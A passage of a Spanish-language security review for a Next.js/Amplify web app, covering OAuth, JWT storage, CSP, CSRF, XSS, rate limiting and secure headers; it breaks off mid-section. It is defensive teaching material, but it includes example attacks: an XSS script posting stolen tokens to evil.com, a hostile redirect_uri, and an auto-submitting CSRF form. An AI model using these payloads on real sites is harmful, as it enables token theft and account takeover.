# Pilar 5: Seguridad

## 🎯 Lo Que Vamos a Analizar

En este pilar, vamos a hacer un **análisis de seguridad completo**:

1. Modelo de amenazas (threat model)
2. OAuth 2.0 security: qué protege y qué no
3. Token security: almacenamiento, transmisión, expiración
4. CSRF protection en OAuth flow
5. XSS prevention
6. Rate limiting y throttling
7. Secure headers (CSP, HSTS, etc.)
8. Vulnerabilidades identificadas y mitigaciones

**No vamos a asumir seguridad**. Vamos a **probar y validar cada capa**.

---

## 🎭 Threat Model - ¿Contra Qué Nos Protegemos?

### Adversarios Potenciales

| Adversario | Nivel | Objetivo | Probabilidad |
|------------|-------|----------|--------------|
| **Script kiddie** | Bajo | Defacement, acceso básico | Alta |
| **Atacante motivado** | Medio | Robo de datos, cuentas | Media |
| **Insider threat** | Alto | Acceso privilegiado | Baja |
| **State actor** | Muy alto | Espionaje, sabotaje | Muy baja |

**Nuestra postura**: Proteger contra ataques de nivel bajo-medio. No somos un banco.

### Vectores de Ataque

```
1. Authentication
   ├── Credential stuffing
   ├── Brute force
   ├── OAuth hijacking
   └── Session hijacking

2. Authorization
   ├── Privilege escalation
   ├── IDOR (Insecure Direct Object Reference)
   └── Group manipulation

3. Data
   ├── XSS (Cross-Site Scripting)
   ├── CSRF (Cross-Site Request Forgery)
   ├── Man-in-the-Middle
   └── Data exfiltration

4. Infrastructure
   ├── DDoS
   ├── Rate limiting bypass
   └── Resource exhaustion
```

---

## 🔐 OAuth 2.0 Security Deep Dive

### Flujo Completo con Security Checkpoints

```
1. Usuario: Click "Login with Google"
   ↓
2. App: Genera state parameter (CSRF protection)
   code: crypto.randomBytes(32).toString('hex')
   ↓
3. App: Redirect a Google
   URL: https://accounts.google.com/o/oauth2/v2/auth
        ?client_id=XXX
        &redirect_uri=https://awspuebla.com/auth/callback
        &response_type=code
        &scope=openid+email+profile
        &state=abc123def456... ← CSRF token
   ↓
4. Google: Valida client_id
   ✅ Client ID registrado
   ✅ Redirect URI autorizado
   ❌ Si falla → Error 400
   ↓
5. Google: Muestra consent screen
   "awspuebla.com quiere acceder a:"
   - Ver tu email
   - Ver tu perfil básico
   ↓
6. Usuario: Acepta (o rechaza)
   ↓
7. Google: Genera authorization code
   code: one-time use, expires en 10 minutos
   ↓
8. Google: Redirect a callback
   URL: https://awspuebla.com/auth/callback
        ?code=4/0AZEOvhXXXXX
        &state=abc123def456...
   ↓
9. App: Valida state parameter
   ✅ state === stored_state
   ❌ Si no coincide → CSRF attack detected
   ↓
10. Amplify: Intercambia code por tokens
    POST https://oauth2.us-east-1.amazoncognito.com/token
    Body:
      grant_type=authorization_code
      code=4/0AZEOvhXXXXX
      redirect_uri=https://awspuebla.com/auth/callback
      client_id=XXX
      client_secret=YYY ← Backend only
   ↓
11. Cognito: Valida con Google
    ✅ Code válido
    ✅ Client secret correcto
    ✅ Redirect URI coincide
    ↓
12. Cognito: Retorna tokens
    {
      id_token: "eyJhbGci...",     // JWT con user info
      access_token: "eyJhbGci...", // JWT con permisos
      refresh_token: "abc123...",  // Opaque token
      expires_in: 3600             // 1 hora
    }
    ↓
13. Amplify: Almacena tokens
    localStorage:
      - CognitoIdentityServiceProvider.XXX.idToken
      - CognitoIdentityServiceProvider.XXX.accessToken
      - CognitoIdentityServiceProvider.XXX.refreshToken
    Cookies (para SSR):
      - Same tokens duplicados
    ↓
14. App: Usuario autenticado ✅
```

### Security Checkpoints Detallados

#### Checkpoint 1: State Parameter (CSRF Protection)

**¿Qué es el state parameter?**

Token aleatorio que previene CSRF attacks.

**Ataque sin state parameter**:
```
1. Atacante: Crea link malicioso
   https://accounts.google.com/o/oauth2/v2/auth
   ?client_id=LEGIT_CLIENT_ID
   &redirect_uri=https://awspuebla.com/auth/callback
   &response_type=code
   &scope=openid+email+profile

2. Víctima: Click en link (engañada por phishing)
   
3. Google: Víctima autoriza con SU cuenta de Google
   
4. Google: Redirect a awspuebla.com/auth/callback?code=XXX
   
5. App: Procesa code, crea sesión con cuenta de la víctima
   
6. Resultado: Atacante está logueado como la víctima ❌
```

**Protección con state parameter**:
```
1. Usuario legítimo: Click "Login with Google" en awspuebla.com
   
2. App: Genera state aleatorio
   state = crypto.randomBytes(32).toString('hex')
   // Ej: "a1b2c3d4e5f6..."
   
3. App: Guarda state en session/cookie
   sessionStorage.setItem('oauth_state', state);
   
4. App: Redirect con state
   URL: ...&state=a1b2c3d4e5f6...
   
5. [Atacante intenta inyectar su propio link, pero no conoce el state]
   
6. Google: Callback con state
   /auth/callback?code=XXX&state=a1b2c3d4e5f6...
   
7. App: Valida state
   const storedState = sessionStorage.getItem('oauth_state');
   if (state !== storedState) {
     throw new Error('CSRF attack detected');
   }
   
8. Solo si state coincide, procesa el code ✅
```

**¿Amplify maneja esto?**

Sí, automáticamente:
```typescript
// Amplify internamente
signInWithRedirect({
  provider: 'Google'
});

// Genera state y lo guarda
const state = generateRandomState();
sessionStorage.setItem('amplify_oauth_state', state);

// En callback
const receivedState = urlParams.get('state');
const storedState = sessionStorage.getItem('amplify_oauth_state');

if (receivedState !== storedState) {
  throw new OAuthStateValidationError();
}
```

**💡 Verificación en DevTools**:
```javascript
// Antes de login:
sessionStorage.getItem('amplify_oauth_state');
// null

// Después de click en "Login with Google":
sessionStorage.getItem('amplify_oauth_state');
// "a1b2c3d4e5f6g7h8i9j0..."

// URL en redirect:
// https://accounts.google.com/...&state=a1b2c3d4e5f6g7h8i9j0...
```

---

#### Checkpoint 2: Redirect URI Validation

**¿Por qué es crítico?**

Previene ataques de redirect.

**Ataque sin validación**:
```
1. Atacante: Modifica redirect_uri
   https://accounts.google.com/o/oauth2/v2/auth
   ?client_id=LEGIT_CLIENT_ID
   &redirect_uri=https://evil.com/steal-tokens ← Cambiado
   &response_type=code
   
2. Google: Si NO valida redirect_uri, redirige a evil.com
   https://evil.com/steal-tokens?code=AUTHORIZATION_CODE
   
3. Atacante: Captura el code, lo intercambia por tokens
   
4. Resultado: Atacante tiene acceso completo ❌
```

**Protección de Google**:
```
Google Cloud Console → OAuth Credentials
Authorized redirect URIs:
  ✅ https://awspuebla.com/auth/callback
  ✅ http://localhost:3000/auth/callback
  ❌ https://evil.com/steal-tokens (no autorizado)

Si atacante intenta usar evil.com:
→ Error 400: redirect_uri_mismatch
```

**Protección de Cognito (doble capa)**:
```typescript
// amplify/auth/resource.ts
export const auth = defineAuth({
  loginWith: {
    externalProviders: {
      google: {
        // ...
        callbackUrls: [
          'http://localhost:3000/auth/callback',
          'https://awspuebla.com/auth/callback',
          'https://www.awspuebla.com/auth/callback'
        ],
      }
    }
  }
});

// Cognito valida que redirect_uri esté en esta lista
// Si no → Error: InvalidParameterException
```

**🐛 Vulnerabilidad potencial**:
```typescript
// ❌ Si agregas wildcard (MAL)
callbackUrls: [
  'https://*.awspuebla.com/auth/callback'  // PELIGROSO
]

// Atacante puede usar:
// https://evil.awspuebla.com/auth/callback
// (si controla un subdomain)
```

**✅ Best practice**:
```typescript
// Lista explícita de URLs permitidas
callbackUrls: [
  'http://localhost:3000/auth/callback',    // Dev
  'https://awspuebla.com/auth/callback',    // Prod
  'https://www.awspuebla.com/auth/callback' // Prod (www)
]

// NO wildcards
// NO dynamic URLs
```

---

#### Checkpoint 3: Client Secret Protection

**¿Qué es el client secret?**

Credencial secreta que prueba que eres la app legítima.

**Flujo de intercambio**:
```
1. App frontend: Tiene authorization code
   code = "4/0AZEOvhXXXXX"

2. App frontend: NO puede intercambiar directamente
   ❌ Razón: client_secret está en backend

3. Amplify (backend): Intercambia code por tokens
   POST /token
   Body:
     client_id = PUBLIC (OK)
     client_secret = SECRET ← Solo backend conoce
     code = "4/0AZEOvhXXXXX"

4. Google: Valida client_secret
   ✅ Si correcto → Retorna tokens
   ❌ Si incorrecto → Error 401
```

**¿Por qué client_secret no puede estar en frontend?**

```javascript
// ❌ Si estuviera en frontend
const CLIENT_SECRET = 'GOCSPX-xxxxxxxxxxxxxxxxxxxx';

// Usuario: Abre DevTools → Sources → main.js
// Ve: CLIENT_SECRET = 'GOCSPX-xxxxxxxxxxxxxxxxxxxx'

// Atacante: Copia el secret, crea su propia app
// Puede hacerse pasar por awspuebla.com ❌
```

**✅ Solución: Backend maneja el intercambio**

```typescript
// amplify/auth/resource.ts
export const auth = defineAuth({
  loginWith: {
    externalProviders: {
      google: {
        clientId: secret('GOOGLE_CLIENT_ID'),
        clientSecret: secret('GOOGLE_CLIENT_SECRET'), // ← Backend only
      }
    }
  }
});

// secret() function lee de AWS Secrets Manager
// Nunca se expone en frontend ✅
```

**¿Dónde vive el secret en producción?**

```
AWS Secrets Manager
├── Name: GOOGLE_CLIENT_SECRET
├── Value: GOCSPX-xxxxxxxxxxxxxxxxxxxx (encriptado)
├── Encryption: AWS KMS (AES-256)
├── Access: IAM role del backend solamente
└── Rotation: Manual (o automático con Lambda)

CloudFormation (generado por Amplify)
└── Lee secret de Secrets Manager
    └── Inyecta en Cognito User Pool config
        └── Cognito usa secret para OAuth
            └── NUNCA se expone a frontend ✅
```

---

## 🔑 Token Security

### Tipos de Tokens

| Token | Formato | Propósito | Expira | Almacenamiento |
|-------|---------|-----------|--------|----------------|
| **ID Token** | JWT | Identidad del usuario | 1 hora | localStorage + cookies |
| **Access Token** | JWT | Autorización (groups, scopes) | 1 hora | localStorage + cookies |
| **Refresh Token** | Opaque | Renovar access token | 30 días | localStorage + cookies |

### Anatomía de un JWT

**ID Token** (decodificado):
```json
{
  "header": {
    "alg": "RS256",              // Algoritmo de firma (RSA 256-bit)
    "kid": "abc123",             // Key ID (para rotar keys)
    "typ": "JWT"
  },
  "payload": {
    "sub": "google_1234567890",  // Subject (user ID único)
    "cognito:username": "john@example.com",
    "email": "john@example.com",
    "email_verified": true,
    "given_name": "John",
    "family_name": "Doe",
    "iss": "https://cognito-idp.us-east-1.amazonaws.com/us-east-1_vr8oRZfP7",
    "aud": "5c7fhqqe4raqnuabr2b7g84du8", // Audience (client ID)
    "iat": 1699564800,           // Issued at (timestamp)
    "exp": 1699568400,           // Expiration (1 hora después)
    "token_use": "id"
  },
  "signature": "..."             // Firma criptográfica
}
```

**Access Token** (decodificado):
```json
{
  "payload": {
    "sub": "google_1234567890",
    "cognito:groups": ["ADMINS", "SPEAKERS"], // ← Grupos aquí
    "iss": "https://cognito-idp.us-east-1.amazonaws.com/us-east-1_vr8oRZfP7",
    "client_id": "5c7fhqqe4raqnuabr2b7g84du8",
    "token_use": "access",
    "scope": "openid email profile",
    "auth_time": 1699564800,
    "exp": 1699568400
  }
}
```

### Validación de Tokens

**¿Cómo saber si un token es legítimo?**

```typescript
// Pasos de validación (Amplify hace esto automáticamente)

async function validateJWT(token: string) {
  // 1. Decodificar header sin verificar
  const header = decodeJWTHeader(token);
  
  // 2. Obtener public key de Cognito
  const keyUrl = `https://cognito-idp.us-east-1.amazonaws.com/us-east-1_vr8oRZfP7/.well-known/jwks.json`;
  const jwks = await fetch(keyUrl).then(r => r.json());
  const publicKey = jwks.keys.find(k => k.kid === header.kid);
  
  // 3. Verificar firma con public key
  const isSignatureValid = crypto.verify(token, publicKey);
  if (!isSignatureValid) {
    throw new Error('Invalid signature');
  }
  
  // 4. Decodificar payload
  const payload = decodeJWTPayload(token);
  
  // 5. Validar expiración
  const now = Math.floor(Date.now() / 1000);
  if (payload.exp < now) {
    throw new Error('Token expired');
  }
  
  // 6. Validar issuer
  if (payload.iss !== 'https://cognito-idp.us-east-1.amazonaws.com/us-east-1_vr8oRZfP7') {
    throw new Error('Invalid issuer');
  }
  
  // 7. Validar audience
  if (payload.aud !== '5c7fhqqe4raqnuabr2b7g84du8') {
    throw new Error('Invalid audience');
  }
  
  // ✅ Token válido
  return payload;
}
```

**Public Key Cryptography** (por qué es seguro):

```
Cognito:
├── Private Key (secreto, solo Cognito lo tiene)
│   └── Firma tokens: signature = sign(payload, privateKey)
└── Public Key (público, cualquiera puede obtener)
    └── Verifica firma: verify(signature, payload, publicKey)

Matemática:
- Solo quien tiene private key puede crear firma válida
- Cualquiera con public key puede verificar firma
- Es imposible derivar private key de public key (RSA 2048-bit)

Resultado:
✅ Cognito firma tokens → Confiamos en ellos
❌ Atacante crea token falso → Firma no valida
```

### Almacenamiento de Tokens

**Opciones disponibles**:

| Storage | Seguridad XSS | Seguridad CSRF | Accesible en SSR | Best for |
|---------|---------------|----------------|------------------|----------|
| **localStorage** | ❌ Vulnerable | ✅ Seguro | ❌ No | SPAs sin SSR |
| **sessionStorage** | ❌ Vulnerable | ✅ Seguro | ❌ No | SPAs temporales |
| **Cookies (httpOnly)** | ✅ Seguro | ❌ Vulnerable | ✅ Sí | SSR apps |
| **Cookies (no httpOnly)** | ❌ Vulnerable | ❌ Vulnerable | ✅ Sí | ❌ No usar |
| **Memory only** | ✅ Seguro | ✅ Seguro | ❌ No | Máxima seguridad, pobre UX |

**Nuestra implementación** (Amplify default):

```typescript
// localStorage (primary)
localStorage.setItem(
  'CognitoIdentityServiceProvider.5c7fhqqe4raqnuabr2b7g84du8.idToken',
  'eyJhbGci...'
);

// Cookies (for SSR)
document.cookie = `CognitoIdentityServiceProvider.5c7fhqqe4raqnuabr2b7g84du8.idToken=eyJhbGci...;`;

// Características:
// - httpOnly: false ❌ (JavaScript puede leer)
// - Secure: true ✅ (solo HTTPS en prod)
// - SameSite: Lax ✅ (CSRF protection)
```

**⚠️ Vulnerabilidad identificada: XSS**

```javascript
// Si hay XSS vulnerability en la app:
<script>
  const token = localStorage.getItem('CognitoIdentityServiceProvider...');
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: token
  });
</script>

// Resultado: Atacante roba token, acceso completo ❌
```

**🛡️ Mitigación: Content Security Policy (CSP)**

```typescript
// next.config.ts
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'", // ⚠️ Idealmente solo 'self'
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "connect-src 'self' https://*.amazoncognito.com https://*.googleusercontent.com",
    ].join('; ')
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

**Análisis de cada directiva**:

```
default-src 'self'
→ Por defecto, solo recursos del mismo origen
→ Bloquea CDNs no autorizados

script-src 'self' 'unsafe-inline'
→ Scripts solo de mismo origen
→ 'unsafe-inline' permite <script> inline (necesario para Next.js)
→ ⚠️ Idealmente: usar nonces para scripts inline

style-src 'self' 'unsafe-inline'
→ Estilos solo de mismo origen o inline
→ Permite Tailwind (CSS-in-JS)

img-src 'self' data: https:
→ Imágenes de mismo origen, data URIs, o HTTPS
→ Permite profile pictures de Google (https://lh3.googleusercontent.com/...)

connect-src 'self' https://*.amazoncognito.com
→ APIs solo de mismo origen o Cognito
→ Bloquea exfiltración de datos a evil.com ✅
```

**🐛 Problema con 'unsafe-inline'**:

```html
<!-- XSS attack todavía posible si hay injection -->
<div>
  User input: <script>alert('XSS')</script>
</div>

<!-- 'unsafe-inline' permite este script ejecutar ❌ -->
```

**✅ Solución ideal: Nonces**

```typescript
// Generar nonce único por request
const nonce = crypto.randomBytes(16).toString('base64');

// Header CSP
`script-src 'self' 'nonce-${nonce}'`;

// En HTML
<script nonce={nonce}>
  // Solo scripts con este nonce ejecutan ✅
</script>
```

---

### Token Refresh Flow

**¿Por qué tokens expiran?**

```
Razones:
1. Limitar ventana de ataque si token es robado
2. Permitir revocación (logout, cambio de permisos)
3. Reducir riesgo de replay attacks

Trade-off:
- Corto (1h): Más seguro, más refreshes
- Largo (24h): Menos seguro, mejor UX
```

**Flujo de refresh**:

```
1. Usuario: Hace acción (fetch API)
   
2. App: Envía access token
   Authorization: Bearer eyJhbGci...
   
3. API: Valida token
   exp = 1699568400 (10:00 AM)
   now = 1699568500 (10:01 AM)
   now > exp → Token expirado ❌
   
4. API: Retorna 401 Unauthorized
   
5. Amplify: Detecta 401
   
6. Amplify: Usa refresh token automáticamente
   POST /oauth2/token
   Body:
     grant_type=refresh_token
     refresh_token=abc123...
     client_id=5c7fhqqe4raqnuabr2b7g84du8
   
7. Cognito: Valida refresh token
   ✅ Refresh token válido (no expirado)
   ✅ Usuario no ha hecho logout
   
8. Cognito: Retorna nuevos tokens
   {
     id_token: "eyJhbGci...", // Nuevo, expira en 1h
     access_token: "eyJhbGci...", // Nuevo, expira en 1h
     // refresh_token: NO cambia (reutilizable)
   }
   
9. Amplify: Guarda nuevos tokens
   localStorage.setItem('...idToken', new_token);
   
10. Amplify: Reintenta request original
    Authorization: Bearer [nuevo access token]
    
11. API: Valida nuevo token → ✅ Exitoso
    
12. Usuario: Ve respuesta (no notó nada)
```

**Seguridad del refresh token**:

```
Características:
- Opaque (no es JWT, solo string aleatorio)
- Expira en 30 días (configurable)
- Single-use: ❌ (reutilizable múltiples veces)
- Revocable: ✅ (logout invalida)

Riesgo:
Si atacante roba refresh token, puede generar access tokens por 30 días ❌

Mitigación:
1. Rotation: Cada refresh devuelve nuevo refresh token (not implemented ⚠️)
2. Detection: Monitorear refreshes anómalos (geolocation, user-agent)
3. Short expiration: Reducir de 30 días a 7 días
```

**💡 Mejora sugerida: Refresh token rotation**

```typescript
// Actualmente:
POST /token → { access_token, id_token }
// refresh_token no cambia

// Mejor (rotation):
POST /token → { 
  access_token, 
  id_token,
  refresh_token: "nuevo_refresh_token" // ← Cambia cada vez
}

// Beneficio:
// - Refresh token viejo se invalida
// - Si atacante roba token, solo funciona una vez
// - Detección más fácil (múltiples refreshes simultáneos = attack)
```

---

## 🛡️ CSRF Protection

**¿Qué es CSRF?**

Cross-Site Request Forgery: Forzar al navegador del usuario a hacer requests no autorizados.

**Ataque clásico** (sin protection):

```html
<!-- evil.com/attack.html -->
<form action="https://awspuebla.com/api/admin/delete-user" method="POST">
  <input type="hidden" name="userId" value="victim123">
</form>
<script>
  // Auto-submit cuando usuario visita página
  document.forms[0].submit();
</script>
```

**Flujo del ataque**:
```
1. Usuario: Logueado en awspuebla.com
   (tiene tokens en localStorage/cookies)

2. Usuario: Visita evil.com (phishing, ad malicioso, etc.)

3. evil.com: Auto-submit form a awspuebla.com

4. Navegador: Envía request con cookies automáticamente
   POST /api/admin/delete-user
   Cookie: auth_token=abc123
   Body: userId=victim123

5. awspuebla.com backend: Ve cookie válida, ejecuta acción ❌
   DELETE user victim123

6. Usuario: Perdió su cuenta (no se dio cuenta)
```

**Protecciones en nuestra app**:

### 1. SameSite Cookies

```typescript
// Amplify configura cookies con SameSite
document.cookie = `auth_token=abc123; SameSite=Lax; Secure`;

// SameSite=Lax:
// ✅ Cookie se envía en navegación top-level (click link)
// ❌ Cookie NO se envía en requests cross-site (POST form desde evil.com)

// Resultado:
// evil.com form POST → No cookies → No auth → Request falla ✅
```

**Valores de SameSite**:

| Valor | Comportamiento | Security | Usabilidad |
|-------|----------------|----------|------------|
| **None** | Cookie en todos los requests | ❌ Baja | ✅ Alta |
| **Lax** | Cookie solo en top-level navigation | ⚠️ Media | ✅ Alta |
| **Strict** | Cookie solo en same-site | ✅ Alta | ⚠️ Media |

**Trade-offs**:

```
Lax (actual):
✅ Previene CSRF en POSTs
✅ Permite OAuth redirects (GET requests)
⚠️ Vulnerable en GET requests (raro)

Strict:
✅ Máxima protección CSRF
❌ Rompe OAuth flow (redirect desde google.com no envía cookie)
❌ Rompe links desde emails

Nuestra elección: Lax (balance) ✅
```

### 2. CSRF Tokens (para forms críticos)

```typescript
// Para acciones críticas (delete account, change password)
// Implementar CSRF token adicional

// Backend genera token
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// Frontend incluye en form
<form onSubmit={handleDeleteAccount}>
  <input type="hidden" name="csrf_token" value={csrfToken} />
  <button>Delete Account</button>
</form>

// Backend valida
if (request.body.csrf_token !== session.csrfToken) {
  throw new Error('CSRF token invalid');
}
```

**⚠️ Estado actual**: No implementado para acciones críticas.

**💡 Mejora sugerida**:

```typescript
// src/hooks/useCSRFToken.ts
export function useCSRFToken() {
  const [token, setToken] = useState<string | null>(null);

  useEffect(() => {
    // Generar token al montar
    const newToken = crypto.randomUUID();
    setToken(newToken);
    sessionStorage.setItem('csrf_token', newToken);
  }, []);

  return token;
}

// src/app/settings/page.tsx
function DeleteAccountForm() {
  const csrfToken = useCSRFToken();

  const handleDelete = async () => {
    await fetch('/api/delete-account', {
      method: 'POST',
      headers: { 'X-CSRF-Token': csrfToken },
      body: JSON.stringify({ confirm: true })
    });
  };

  return <button onClick={handleDelete}>Delete Account</button>;
}
```

---

## 🚫 XSS Prevention

**¿Qué es XSS?**

Cross-Site Scripting: Inyectar JavaScript malicioso en la app.

**Tipos de XSS**:

### 1. Stored XSS (más peligroso)

```typescript
// Escenario: Usuario puede crear posts
function createPost(content: string) {
  // ❌ Sin sanitización
  database.insert({ content }); // Guarda: <script>alert('XSS')</script>
}

// Luego, cuando se renderiza:
function PostComponent({ post }) {
  // ❌ dangerouslySetInnerHTML
  return <div dangerouslySetInnerHTML={{ __html: post.content }} />;
}

// Resultado: Script ejecuta en navegador de todos los usuarios ❌
```

**Ataque real**:
```javascript
// Atacante crea post:
const maliciousContent = `
  <script>
    const token = localStorage.getItem('CognitoIdentityServiceProvider...');
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: token
    });
  </script>
`;

// Script ejecuta en navegador de víctimas
// Roba tokens de TODOS los que vean el post ❌
```

**Protección en React**:

```typescript
// ✅ React escapa automáticamente
function PostComponent({ post }) {
  return <div>{post.content}</div>;
}

// Si content = "<script>alert('XSS')</script>"
// React renderiza: &lt;script&gt;alert('XSS')&lt;/script&gt;
// No ejecuta, solo muestra texto ✅
```

**⚠️ Cuando React NO protege**:

```typescript
// ❌ dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ❌ innerHTML directo
element.innerHTML = userInput;

// ❌ eval()
eval(userInput);

// ❌ new Function()
const fn = new Function(userInput);
```

**✅ Solución: Sanitización**

```typescript
import DOMPurify from 'dompurify';

function PostComponent({ post }) {
  // Sanitizar HTML antes de renderizar
  const clean = DOMPurify.sanitize(post.content);
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// DOMPurify elimina:
// - <script> tags
// - onclick, onerror, etc. event handlers
// - javascript: URLs
// Permite:
// - <p>, <div>, <span> (tags seguros)
// - <b>, <i>, <strong> (formato)
// - <a href="https://..."> (links https solamente)
```

### 2. Reflected XSS

```typescript
// ❌ Vulnerabilidad: Renderizar query params sin sanitizar
function SearchPage() {
  const params = new URLSearchParams(window.location.search);
  const query = params.get('q');

  return (
    <div>
      <h1>Search results for: {query}</h1>
      {/* React escapa automáticamente ✅ */}
    </div>
  );
}

// Ataque:
// URL: /search?q=<script>alert('XSS')</script>
// React renderiza: Search results for: &lt;script&gt;...
// No ejecuta ✅

// Pero si usas dangerouslySetInnerHTML:
// <h1 dangerouslySetInnerHTML={{ __html: `Results for: ${query}` }} />
// Script ejecuta ❌
```

**Estado actual de nuestra app**:

```bash
# Buscar usos peligrosos
grep -r "dangerouslySetInnerHTML" src/
grep -r "innerHTML" src/
grep -r "eval(" src/

# Resultado: Ninguno encontrado ✅
```

**💡 Mejora: ESLint rule**

```javascript
// .eslintrc.js
module.exports = {
  rules: {
    'react/no-danger': 'error', // Prohibir dangerouslySetInnerHTML
    'no-eval': 'error',         // Prohibir eval()
  }
};
```

### 3. DOM-based XSS

```typescript
// ❌ Vulnerabilidad: Manipular DOM directamente
function updateProfile() {
  const name = document.getElementById('name-input').value;
  document.getElementById('profile-name').innerHTML = name; // ❌
}

// Ataque:
// Input: <img src=x onerror="alert('XSS')">
// DOM: <div id="profile-name"><img src=x onerror="..."></div>
// Script ejecuta ❌

// ✅ Solución: React (no manipular DOM directamente)
function ProfileForm() {
  const [name, setName] = useState('');

  return (
    <div>
      <input value={name} onChange={e => setName(e.target.value)} />
      <div>Profile: {name}</div> {/* React escapa ✅ */}
    </div>
  );
}
```

---

## ⚡ Rate Limiting

**¿Por qué rate limiting?**

Prevenir:
1. Brute force attacks (adivinar passwords)
2. DDoS attacks (saturar servidores)
3. Credential stuffing (probar credenciales robadas)
4. Resource exhaustion (agotar quotas de AWS)

**Niveles de rate limiting**:

### 1. Cognito (Built-in)

```
Cognito User Pool limits (per account):
├── SignUp: 50 requests/second
├── SignIn: 50 requests/second
├── InitiateAuth: 50 requests/second
├── GetUser: 120 requests/second ← Nuestra app usa esto
└── RefreshToken: 50 requests/second

Si se excede:
→ TooManyRequestsException
→ Retry-After: 1 (esperar 1 segundo)
```

**¿Qué pasa si usuario legítimo hace 800 requests/min?**

```
Cálculo:
800 requests/min = 13.3 requests/second
Límite de Cognito: 120 requests/second

13.3 < 120 → No hay throttling ✅

Pero si 60 usuarios simultáneos:
60 × 13.3 = 798 requests/second
798 > 120 → Throttling ❌
```

**Esto justifica nuestras optimizaciones**:

```
Antes: 800 calls/min/user
60 usuarios = 798 req/s → Throttling ❌

Después: 160 calls/min/user
60 usuarios = 160 req/s → Dentro de límite ✅
```

### 2. Next.js Middleware (Custom)

**💡 Implementación sugerida**:

```typescript
// src/middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

// Simple in-memory rate limiter (mejor usar Redis en prod)
const ratelimit = new Map<string, { count: number; resetAt: number }>();

export function middleware(request: NextRequest) {
  // Identificar usuario por IP
  const ip = request.ip || request.headers.get('x-forwarded-for') || 'unknown';
  
  // Rate limit: 100 requests por minuto por IP
  const limit = 100;
  const window = 60 * 1000; // 1 minuto en ms
  
  const now = Date.now();
  const userLimit = ratelimit.get(ip);
  
  if (!userLimit || now > userLimit.resetAt) {
    // Ventana expiró, reset
    ratelimit.set(ip, { count: 1, resetAt: now + window });
    return NextResponse.next();
  }
  
  if (userLimit.count >= limit) {
    // Rate limit excedido
    return new NextResponse('Too Many Requests', {
      status: 429,
      headers: {
        'Retry-After': String(Math.ceil((userLimit.resetAt - now) / 1000)),
      },
    });
  }
  
  // Incrementar contador
  userLimit.count++;
  return NextResponse.next();
}

export const config = {
  matcher: '/api/:path*', // Solo para API routes
};
```

**Problemas con in-memory limiter**:

```
1. No persiste entre deploys
2. No funciona en serverless (cada request es nueva instancia)
3. No funciona con múltiples servers

Solución: Redis
```

**Con Redis (Vercel KV)**:

```typescript
import { kv } from '@vercel/kv';

export async function middleware(request: NextRequest) {
  const ip = request.ip || 'unknown';
  const key = `ratelimit:${ip}`;
  
  // Atomic increment con expiración
  const count = await kv.incr(key);
  
  if (count === 1) {
    await kv.expire(key, 60); // Expira en 60 segundos
  }
  
  if (count > 100) {
    return new NextResponse('Too Many Requests', { status: 429 });
  }
  
  return NextResponse.next();
}
```

**Pricing de Vercel KV**:

```
Free tier:
- 30,000 commands/month
- 256MB storage

Nuestro uso estimado:
- 1000 usuarios/día × 160 requests = 160,000 requests/día
- 160,000 × 30 días = 4,800,000 requests/mes
- Costo: ~$10/mes en tier Pro

¿Vale la pena?
- Previene DDoS → Ahorro en bandwidth > $10/mes ✅
- Mejora UX (no throttling de Cognito) ✅
```

### 3. WAF (Web Application Firewall)

**AWS WAF** (para producción seria):

```
Protecciones:
├── IP rate limiting: 2000 requests/5 min por IP
├── Geographic blocking: Bloquear países específicos
├── Managed rules: OWASP Top 10
├── Bot detection: Distinguir humanos vs bots
└── DDoS mitigation: Auto-scaling

Costo:
- $5/mes por WebACL
- $1/mes por rule
- $0.60 por millón de requests
Total: ~$20/mes para app pequeña
```

**⚠️ Estado actual**: No implementado.

**💡 Recomendación**: Implementar cuando escale >10,000 usuarios.

---

## 🔒 Secure Headers

**Headers de seguridad críticos**:

```typescript
// next.config.ts
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  },
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self'",
      "connect-src 'self' https://*.amazoncognito.com https://accounts.google.com",
      "frame-ancestors 'self'"
    ].join('; ')
  }
];
```

**Análisis de cada header**:

### 1. Strict-Transport-Security (HSTS)

```
Propósito: Forzar HTTPS siempre

Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

max-age=63072000
→ 2 años en segundos
→ Navegador SOLO usará HTTPS por 2 años

includeSubDomains
→ Aplica a todos los subdominios (*.awspuebla.com)

preload
→ Incluir en HSTS preload list (hardcoded en navegadores)
→ Protege incluso primera visita

Protege contra:
- SSL stripping attacks
- Man-in-the-middle downgrade attacks
```

**⚠️ Riesgo**: Si configuras mal HTTPS, sitio inaccesible por 2 años.

**Best practice**: Empezar con `max-age=300` (5 min), luego aumentar.

### 2. X-Frame-Options

```
Propósito: Prevenir clickjacking

X-Frame-Options: SAMEORIGIN

Valores:
- DENY: No puede ir en iframe (ningún sitio)
- SAMEORIGIN: Solo en iframe del mismo origen ✅
- ALLOW-FROM url: Solo en iframe de URL específica (deprecated)

Ataque de clickjacking sin header:
1. evil.com crea iframe:
   <iframe src="https://awspuebla.com/delete-account"></iframe>
   
2. evil.com oculta iframe (opacity: 0.01)
   
3. evil.com pone botón falso encima
   "Click for free iPhone!"
   
4. Usuario click → En realidad clickea "Delete Account" en iframe ❌

Con SAMEORIGIN:
